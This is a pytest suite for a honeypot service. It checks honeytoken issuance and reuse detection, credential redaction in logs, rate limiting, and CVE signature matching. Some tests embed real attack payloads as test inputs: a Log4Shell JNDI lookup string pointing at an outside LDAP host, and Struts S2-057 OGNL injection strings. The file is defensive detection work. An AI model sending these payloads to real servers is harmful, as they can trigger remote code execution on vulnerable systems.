"""Verification for the pre-release fixes. Run inside the app/ dir."""
import json, os, time, pathlib
import pytest
from fastapi.testclient import TestClient

LOGDIR = pathlib.Path(os.environ["HB_LOG_DIR"])


@pytest.fixture(autouse=True)
def _isolate():
    """Each test starts with an empty rate-limit bucket and token memory.

    Without this the suite tests the rate limiter rather than what it means to,
    and every later assertion sees 429s.
    """
    import main
    main._rate_buckets.clear()
    main._issued_token_ids.clear()
    main._issued_token_order.clear()
    main._issued_token_prefixes.clear()
    yield
    main._rate_buckets.clear()


def events():
    p = LOGDIR / "http_events.jsonl"
    if not p.exists():
        return []
    return [json.loads(l) for l in p.read_text().splitlines() if l.strip()]


def test_honeytoken_reuse_still_detected():
    """The scan was inverted for performance; detection must be unchanged."""
    import main
    c = TestClient(main.app)
    c.get("/.env")
    issued = [e for e in events() if e.get("event") == "honeytoken_issued"]
    assert issued, "no honeytokens were minted by GET /.env"
    tok = issued[0]["token"]

    # replay in each of the four inspected locations
    for where, call in [
        ("query", lambda: c.get(f"/anything?k={tok}")),
        ("body", lambda: c.post("/api/run-job", content=f"payload={tok}")),
        ("headers", lambda: c.get("/anything", headers={"x-probe": tok})),
    ]:
        before = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
        call()
        after = [e for e in events() if e.get("event") == "honeytoken_reuse_observed"]
        assert len(after) > before, f"reuse NOT detected in {where}"
        assert after[-1]["token"] == tok
        print(f"  reuse detected in {where}: seen_in={after[-1]['seen_in']}")


def test_uppercase_and_padded_token_detected():
    """Served values uppercase the id (AKIA...) and repeat it to pad width."""
    import main
    c = TestClient(main.app)
    c.get("/.aws/credentials")
    issued = [e for e in events() if e.get("event") == "honeytoken_issued"]
    tok = issued[-1]["token"]
    before = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
    c.get("/x", headers={"authorization-probe": "AKIA" + (tok * 2).upper()})
    after = [e for e in events() if e.get("event") == "honeytoken_reuse_observed"]
    assert len(after) > before, "padded/uppercase form not detected"
    print(f"  padded+uppercase detected: {after[-1]['token'] == tok}")


def test_unissued_token_not_flagged():
    import main
    c = TestClient(main.app)
    before = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
    c.get("/anything?k=deadbeefdeadbeef")  # 16 hex chars, never issued
    after = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
    assert after == before, "false positive on an unissued 16-hex string"
    print("  no false positive on unissued hex")


def test_scan_cost_is_independent_of_issued_count():
    """The whole point of the inversion: 50k issued tokens must not slow the scan.

    Timed against _check_honeytoken_reuse directly rather than through 20 HTTP
    round trips. The claim is about the scan, and routing 60KB through the ASGI
    stack twenty times measures mostly the stack: on a shared CI runner that
    added enough variance to fail a 3x bound on a ratio whose true value is
    ~1.0. Measuring the scan itself allows a much tighter bound, so this is a
    stronger check than the one it replaces, not a relaxed one.

    Best-of-N rather than total, so one descheduled sample cannot set the result.
    """
    import main, asyncio

    body = b"A" * 60_000
    headers = {"user-agent": "scan-cost-probe"}

    def best_scan_seconds(rounds=7):
        best = float("inf")
        for _ in range(rounds):
            t0 = time.perf_counter()
            asyncio.run(main._check_honeytoken_reuse("/probe", "", body, headers))
            best = min(best, time.perf_counter() - t0)
        return best

    main._issued_token_ids.clear()
    main._issued_token_order.clear()
    main._issued_token_prefixes.clear()
    empty = best_scan_seconds()

    for i in range(50_000):
        main._remember_issued_token(f"{i:016x}")
    assert len(main._issued_token_ids) == 50_000
    full = best_scan_seconds()

    ratio = full / empty if empty else 0
    print(f"  64KB scan: empty-set {empty*1000:.3f}ms, 50k-token set "
          f"{full*1000:.3f}ms (x{ratio:.2f})")
    assert ratio < 1.5, f"scan now scales with issued-token count (x{ratio:.2f})"


def test_requests_still_served_with_a_full_token_index():
    """Integration cover for the above: 50k tokens must not break the request path."""
    import main
    c = TestClient(main.app)
    for i in range(50_000):
        main._remember_issued_token(f"{i:012x}beef")
    r = c.post("/api/run-job", content="A" * 60_000)
    assert r.status_code in (200, 404, 503), r.status_code

    tok = f"{7:012x}beef"
    before = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
    c.get(f"/anything?k={tok}")
    new_events = [e for e in events()
                  if e.get("event") == "honeytoken_reuse_observed"][before:]
    assert new_events, "lookup failed against a full index"

    # Membership, not "the only match". The scan slides across every offset in a
    # hex run, because a served value may pad or repeat the id, so densely
    # packed synthetic ids legitimately produce extra prefix candidates. Real
    # uuid4-derived ids do not collide like this; asserting a single match here
    # would be testing the fixture rather than the code.
    by_token = {e["token"]: e for e in new_events}
    assert tok in by_token, f"{tok} not among {sorted(by_token)}"
    assert by_token[tok]["matched"] == "full"
    print(f"  full index serves requests and matches on lookup "
          f"({len(new_events)} candidate(s), exact id among them)")


def test_header_value_is_capped_in_log():
    import main
    c = TestClient(main.app)
    c.get("/anything", headers={"x-big": "z" * 200_000})
    rec = [e for e in events() if e.get("event") == "request"][-1]
    line = json.dumps(rec)
    assert len(line) < 60_000, f"one request wrote {len(line)} bytes to the log"
    assert "<truncated:len=200000>" in line
    print(f"  200KB header -> {len(line)} byte log line")


def test_healthz_reports_write_failure():
    import main
    c = TestClient(main.app)
    assert c.get("/healthz").status_code == 200
    main.writer.last_write_error = "OSError: [Errno 28] No space left on device"
    main.writer.write_failures = 3
    r = c.get("/healthz")
    assert r.status_code == 503 and r.json() == {"ok": False}
    assert "free" not in r.text and "space" not in r.text, "healthz leaked operator detail"
    main.writer.last_write_error = None
    assert c.get("/healthz").status_code == 200
    print("  healthz 503s on write failure, body stays {'ok': false}")


def test_client_disconnect_still_logs_request():
    """A body read that dies mid-stream must not lose the request record."""
    import main, asyncio
    from starlette.requests import ClientDisconnect

    class FakeReq:
        async def stream(self):
            yield b"partial-payload"
            raise ClientDisconnect()

    body, exceeded = asyncio.run(main._read_capped_body(FakeReq()))
    assert body == b"partial-payload" and exceeded is False
    print("  mid-body disconnect returns partial body instead of raising")


def test_db_password_reuse_now_detected():
    """12-char prefix honeytokens (~14% of issuances) were undetectable."""
    import main
    c = TestClient(main.app)
    c.get("/.env")
    issued = [e for e in events() if e.get("event") == "honeytoken_issued"]
    dbp = [e for e in issued if e.get("kind") == "db_password"]
    assert dbp, f"no db_password issued; kinds seen: {set(e.get('kind') for e in issued)}"
    tok = dbp[-1]["token"]
    served = tok[:12]
    assert len(served) == 12
    before = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
    c.get(f"/anything?db={served}")
    after = [e for e in events() if e.get("event") == "honeytoken_reuse_observed"]
    assert len(after) > before, "12-char db_password replay STILL not detected"
    assert after[-1]["token"] == tok and after[-1]["matched"] == "prefix"
    print(f"  db_password 12-char replay detected -> full id {tok}")


def test_struts_s2_057_signatures_fire():
    import signatures
    for payload in ["redirect:${233*233}", "redirectAction:${233*233}",
                    "${@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}"]:
        hit = any(cve == "CVE-2018-11776" and pat.search(payload)
                  for cve, pat, _, _ in signatures.CVE_SIGNATURES)
        assert hit, f"S2-057 pattern still misses: {payload}"
    print("  CVE-2018-11776 matches all 3 real-world payload shapes")


def test_duplicate_header_payload_is_scanned():
    import main, signatures
    raw = [["referer", "harmless"], ["referer", "${jndi:ldap://x/a}"]]
    text = main._headers_haystack(raw)
    hit = any(cve == "CVE-2021-44228" and pat.search(text)
              for cve, pat, _, _ in signatures.CVE_SIGNATURES)
    assert hit, "payload in a duplicate header's 2nd occurrence still missed"
    print("  Log4Shell in duplicate header now scanned")


def test_internal_healthcheck_not_logged():
    import main
    c = TestClient(main.app)
    before = len([e for e in events() if e.get("event") == "request"])
    c.get("/healthz")                                        # loopback, no XFF
    mid = len([e for e in events() if e.get("event") == "request"])
    assert mid == before, "internal healthcheck polluted the dataset"
    c.get("/healthz", headers={"x-forwarded-for": "203.0.113.5"})   # via Caddy
    after = len([e for e in events() if e.get("event") == "request"])
    assert after == mid + 1, "external /healthz probe was wrongly dropped"
    print("  internal healthcheck skipped, external probe still logged")


# --------------------------------------------------------------------------- #
# Fixes from the 2026-08 pre-publication review.
# --------------------------------------------------------------------------- #
def test_catch_all_post_credentials_are_redacted():
    """The non-retention promise applied to four handlers, not to the service.

    /admin is advertised in robots.txt but only registers GET, so a stuffing
    tool POSTing to the advertised URL fell through to catch_all and had its
    credentials written to body_excerpt verbatim.
    """
    import main
    c = TestClient(main.app)
    secret = "REAL-STOLEN-PW-DO-NOT-RETAIN"
    for path, body, ctype in [
        ("/admin", f"username=victim%40example.com&password={secret}",
         "application/x-www-form-urlencoded"),
        ("/login", f"user=victim2&pass={secret}",
         "application/x-www-form-urlencoded"),
        ("/user/login", json.dumps({"username": "victim3", "password": secret}),
         "application/json"),
    ]:
        c.post(path, content=body, headers={"content-type": ctype})
        rec = [e for e in events() if e.get("event") == "request"][-1]
        assert secret not in json.dumps(rec), f"{path} retained the password"
        assert rec["body_excerpt"].startswith("<redacted:credential-submission"), \
            f"{path} body_excerpt not redacted: {rec['body_excerpt']!r}"
        assert rec["creds_submitted"]["pass_present"] is True
        assert rec["creds_submitted"]["source"] == "body-inferred"
    print("  catch-all credential POSTs are redacted to shape only")


def test_sensitive_headers_are_redacted():
    """x-api-key and friends are exactly the headers this project is about."""
    import main
    c = TestClient(main.app)
    secret = "sk_live_REALVICTIMKEY"
    for header in ("x-api-key", "x-auth-token", "api-key", "x-amz-security-token"):
        c.get("/anything", headers={header: secret})
        rec = [e for e in events() if e.get("event") == "request"][-1]
        assert secret not in json.dumps(rec), f"{header} retained verbatim"
        assert rec["headers"][header].startswith("<redacted:key:"), rec["headers"][header]
    print("  api-key-family headers redacted with an hmac, not stored")


def test_redaction_digest_is_stable_within_a_run():
    """Same unknown credential twice must stay correlatable after redaction."""
    import main
    a = main._redaction_digest("hunter2")
    b = main._redaction_digest("hunter2")
    c_ = main._redaction_digest("hunter3")
    assert a == b and a != c_
    assert "hunter2" not in a
    print("  redaction digest correlates repeats without keeping the value")


def test_served_token_len_declarations_are_accurate():
    """The prefix bug's root cause: nothing checked what a formatter served."""
    import formatters
    tok = "0123456789abcdef"
    assert set(formatters.SERVED_TOKEN_LEN) == set(formatters.FORMATTERS), \
        "a formatter exists with no declared served length"
    for kind, declared in formatters.SERVED_TOKEN_LEN.items():
        actual = formatters.served_run_len(kind, tok, catcher_url=f"https://x/x/{tok}")
        assert actual == declared, f"{kind} declares {declared}, serves {actual}"
    import main
    assert main.TOKEN_PREFIX_LEN == min(formatters.SERVED_TOKEN_LEN.values())
    print(f"  all {len(formatters.SERVED_TOKEN_LEN)} kinds declare their served length correctly")


def test_reuse_detected_while_rate_limited():
    """A credential replay arrives as a burst; the detector slept through bursts."""
    import main
    c = TestClient(main.app)
    c.get("/.git/config")
    issued = [e for e in events() if e.get("event") == "honeytoken_issued"]
    tok = issued[-1]["token"]

    for _ in range(main.RATE_MAX_REQ + 2):
        c.get("/filler")
    assert c.get("/filler").status_code == 429, "rate limiter did not engage"

    before = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
    r = c.get("/probe", headers={"authorization": f"Bearer ghp_{tok}"})
    assert r.status_code == 429, "expected this request to be rate limited"
    after = [e for e in events() if e.get("event") == "honeytoken_reuse_observed"]
    assert len(after) > before, "replay during a burst was NOT detected"
    assert after[-1]["token"] == tok and after[-1]["body_available"] is False
    print("  honeytoken replay detected even while rate limited")


def test_oversized_body_retains_leading_bytes():
    """A single oversized chunk used to discard the whole body, not the excess."""
    import main, asyncio

    class OneBigChunk:
        async def stream(self):
            yield b"P" * (main.BODY_CAP + 1)

    body, exceeded = asyncio.run(main._read_capped_body(OneBigChunk()))
    assert exceeded is True
    assert len(body) == main.BODY_CAP, f"retained {len(body)} bytes, expected {main.BODY_CAP}"
    print(f"  oversized single chunk retains {len(body)} bytes instead of 0")


def test_unissued_catcher_probe_is_separate_event():
    """/x/ is walkable; an unissued id is not proof of use."""
    import main
    c = TestClient(main.app)
    c.get("/x/ffffffffffffffff")
    # The middleware writes its `request` record after the handler runs, so
    # filter for the catcher event rather than taking the last line.
    probes = [e for e in events() if e.get("event") == "catcher_probe_unissued"]
    assert probes and probes[-1]["token"] == "ffffffffffffffff"
    assert not [e for e in events() if e.get("event") == "honeytoken_triggered"]

    c.get("/.env")
    tok = [e for e in events() if e.get("event") == "honeytoken_issued"][-1]["token"]
    c.get(f"/x/{tok}")
    trig = [e for e in events() if e.get("event") == "honeytoken_triggered"]
    assert trig and trig[-1]["token"] == tok
    assert len([e for e in events() if e.get("event") == "catcher_probe_unissued"]) == len(probes)
    print("  unissued catcher probes no longer count as confirmed triggers")


def test_issued_token_index_rebuilds_from_log():
    """A restart used to empty the index, making every prior token unmatchable."""
    import main
    c = TestClient(main.app)
    c.get("/.env")
    tok = [e for e in events() if e.get("event") == "honeytoken_issued"][-1]["token"]

    main._issued_token_ids.clear()
    main._issued_token_order.clear()
    main._issued_token_prefixes.clear()
    assert tok not in main._issued_token_ids

    restored = main.rebuild_issued_token_index()
    assert restored > 0 and tok in main._issued_token_ids

    before = len([e for e in events() if e.get("event") == "honeytoken_reuse_observed"])
    c.get(f"/anything?k={tok}")
    after = [e for e in events() if e.get("event") == "honeytoken_reuse_observed"]
    assert len(after) > before, "replay after a simulated restart was not detected"
    print(f"  index rebuilt from log ({restored} issuances), replay still detected")


def test_graphql_does_not_retain_raw_body():
    import main
    c = TestClient(main.app)
    secret = "GQL-REAL-PASSWORD"
    c.post("/graphql", content=json.dumps(
        {"query": f'mutation {{ login(user:"v", password:"{secret}") }}'}),
        headers={"content-type": "application/json"})
    gql = [e for e in events() if e.get("event") == "graphql_query"][-1]
    assert secret not in json.dumps(gql), f"graphql retained the password: {gql}"
    assert "<redacted>" in gql["query"]

    c.post("/graphql", content=b"\x00not-json-" + secret.encode(),
           headers={"content-type": "application/json"})
    gql = [e for e in events() if e.get("event") == "graphql_query"][-1]
    assert gql["parsed"] is False and gql["query"] == ""
    assert secret not in json.dumps(gql), "unparseable graphql body retained raw"
    print("  graphql retains neither inline credentials nor raw unparsed bodies")


def test_oversize_record_is_bounded_not_dropped():
    import main
    rec = {"event": "request", "ip": "203.0.113.9", "path": "/x",
           "status_served": 200, "route_kind": "catch-all",
           "junk": "z" * (main.RECORD_MAX_BYTES + 10)}
    main.writer.write(rec)
    last = events()[-1]
    assert last.get("oversize_record") is True
    assert last["ip"] == "203.0.113.9" and "junk" not in last
    assert last["original_len"] > main.RECORD_MAX_BYTES
    print("  oversize record truncated to identifying fields, still written")


REPO_ROOT = pathlib.Path(__file__).resolve().parent.parent


def _import_analyze():
    import sys
    if str(REPO_ROOT) not in sys.path:
        sys.path.insert(0, str(REPO_ROOT))
    import analyze
    return analyze


def test_signature_tables_are_not_duplicated():
    """analyze.py and main.py drifted because each had its own copy."""
    import main, signatures
    analyze = _import_analyze()
    assert analyze.CVE_SIGNATURES is signatures.CVE_SIGNATURES
    assert analyze.ROUTE_VARIANT is signatures.ROUTE_VARIANT
    assert analyze.TOOL_INVOCATION_SIGNATURES is signatures.TOOL_INVOCATION_SIGNATURES
    assert main.ROUTE_VARIANT is signatures.ROUTE_VARIANT
    print("  analyzer and service share one signature table")


def test_analyzer_output_matches_published_fixture():
    """A report must be reproducible from a published input.

    An earlier findings document claimed "the counts here are what the analyzer
    prints" while the analyzer did not compute half of them. A frozen fixture
    plus a frozen expected report makes that kind of sentence checkable by a
    reader instead of a claim they take on trust.
    """
    import subprocess, sys
    fixture = REPO_ROOT / "fixtures" / "sample_events.jsonl"
    expected = (REPO_ROOT / "fixtures" / "expected_analysis.txt").read_text()
    got = subprocess.run(
        [sys.executable, str(REPO_ROOT / "analyze.py"), str(fixture), "--rescan"],
        capture_output=True, text=True, check=True).stdout
    # The fixture path is echoed by basename, so the report is location-independent.
    assert got == expected, (
        "analyzer output drifted from fixtures/expected_analysis.txt.\n"
        "If the change is intended, regenerate with:\n"
        "  python analyze.py fixtures/sample_events.jsonl --rescan > fixtures/expected_analysis.txt"
    )
    print("  analyzer reproduces the frozen fixture report exactly")


def test_fixture_demonstrates_retroactive_detection():
    """The fixture must actually exercise the live-vs-rescan gap it documents."""
    analyze = _import_analyze()
    expected = (REPO_ROOT / "fixtures" / "expected_analysis.txt").read_text()
    live = expected.split("LIVE")[1].split("RESCAN")[0]
    rescan = expected.split("RESCAN")[1]
    live_cves = {ln.split()[0] for ln in live.splitlines() if ln.startswith("   CVE-")}
    rescan_cves = {ln.split()[0] for ln in rescan.splitlines() if ln.startswith("   CVE-")}
    assert live_cves < rescan_cves, "fixture no longer shows a retroactive gap"
    # CVE-2025-55182's signature ships after the traffic it matches, which is
    # the situation FINDINGS.md's caveats exist to make an operator check for.
    assert "CVE-2025-55182" in rescan_cves and "CVE-2025-55182" not in live_cves
    print(f"  live found {len(live_cves)} CVE(s), rescan found {len(rescan_cves)}")


def test_analyzer_survives_a_torn_final_line():
    """pull-telemetry.sh rsyncs a file being appended to; a torn tail is normal."""
    import subprocess, sys, tempfile
    fixture = (REPO_ROOT / "fixtures" / "sample_events.jsonl").read_text()
    with tempfile.NamedTemporaryFile("w", suffix=".jsonl", delete=False) as fh:
        fh.write(fixture + '{"ts":"2026-07-22T21:00:00+00:00","event":"req')
        torn = fh.name
    r = subprocess.run([sys.executable, str(REPO_ROOT / "analyze.py"), torn],
                       capture_output=True, text=True)
    assert r.returncode == 0, f"analyzer aborted on a torn line:\n{r.stderr}"
    assert "malformed lines skipped: 1" in r.stdout
    print("  torn final line skipped and counted, report still produced")


def test_analyzer_truncates_third_party_ips_by_default():
    """Truncation was once claimed as a property of the data with nothing behind it."""
    import subprocess, sys
    fixture = REPO_ROOT / "fixtures" / "sample_events.jsonl"
    out = subprocess.run([sys.executable, str(REPO_ROOT / "analyze.py"), str(fixture)],
                         capture_output=True, text=True, check=True).stdout
    assert "198.51.100.0/24" in out
    assert "198.51.100.10" not in out, "a full third-party address was printed"
    full = subprocess.run([sys.executable, str(REPO_ROOT / "analyze.py"), str(fixture),
                           "--full-ips"], capture_output=True, text=True, check=True).stdout
    assert "198.51.100.10" in full, "--full-ips did not restore full addresses"
    print("  third-party IPs print as /24 unless --full-ips is passed")


def test_analyzer_excludes_self_test_traffic():
    import subprocess, sys
    fixture = REPO_ROOT / "fixtures" / "sample_events.jsonl"
    out = subprocess.run([sys.executable, str(REPO_ROOT / "analyze.py"), str(fixture),
                          "--exclude-ip", "198.51.100.10"],
                         capture_output=True, text=True, check=True).stdout
    # 3 request records plus the reuse event recorded for that IP.
    assert "excluded: 4 by --exclude-ip" in out, out[:400]
    print("  self-test exclusion is a documented flag, not a manual step")
